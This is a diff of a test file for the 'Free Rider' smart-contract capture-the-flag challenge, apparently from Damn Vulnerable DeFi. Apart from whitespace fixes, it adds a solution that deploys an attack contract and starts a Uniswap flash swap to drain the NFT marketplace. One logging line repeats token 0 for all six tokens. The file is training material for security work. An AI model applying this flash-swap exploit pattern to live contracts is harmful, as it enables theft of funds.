@@ -15,7 +15,7 @@ describe('[Challenge] Free Rider', function () {
     const NFT_PRICE = 15n * 10n ** 18n;
     const AMOUNT_OF_NFTS = 6;
     const MARKETPLACE_INITIAL_ETH_BALANCE = 90n * 10n ** 18n;
-    
+
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
 
     const BOUNTY = 45n * 10n ** 18n;
@@ -46,7 +46,7 @@ describe('[Challenge] Free Rider', function () {
             uniswapFactory.address,
             weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // The function takes care of deploying the pair automatically
         await token.approve(
@@ -62,7 +62,7 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
         uniswapPair = await (new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)).attach(
             await uniswapFactory.getPair(token.address, weth.address)
@@ -99,13 +99,46 @@ describe('[Challenge] Free Rider', function () {
         // Deploy devs' contract, adding the player as the beneficiary
         devsContract = await (await ethers.getContractFactory('FreeRiderRecovery', devs)).deploy(
             player.address, // beneficiary
-            nft.address, 
+            nft.address,
             { value: BOUNTY }
         );
     });
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let attackFactory = await ethers.getContractFactory('AttackFreeRider', player);
+        let attack = await attackFactory.deploy(
+            uniswapFactory.address,
+            uniswapRouter.address,
+            marketplace.address,
+            devsContract.address,
+            nft.address,
+            { value: 5n * 10n ** 16n });
+
+        balance = await ethers.provider.getBalance(attack.address)
+        console.log("Attack ETH before: ", balance);
+
+        balance = await ethers.provider.getBalance(player.address)
+        console.log("Player ETH before: ", balance);
+
+        console.log("Token 0", await nft.ownerOf(0))
+        console.log("Token 1", await nft.ownerOf(0))
+        console.log("Token 2", await nft.ownerOf(0))
+        console.log("Token 3", await nft.ownerOf(0))
+        console.log("Token 4", await nft.ownerOf(0))
+        console.log("Token 5", await nft.ownerOf(0))
+        console.log("Player ", player.address)
+        console.log("Attack ", attack.address)
+        console.log()
+
+        //We now that token0 is WETH from the deployment code:
+        let tx = await uniswapPair.connect(player).swap(15n * 10n ** 18n, 0, attack.address, "0x01", { gasLimit: 1e6 });
+        await tx.wait();
+
+        balance = await ethers.provider.getBalance(attack.address)
+        console.log("Attack ETH after: ", balance);
+        balance = await ethers.provider.getBalance(player.address)
+        console.log("Player ETH after: ", balance);
     });
 
     after(async function () {
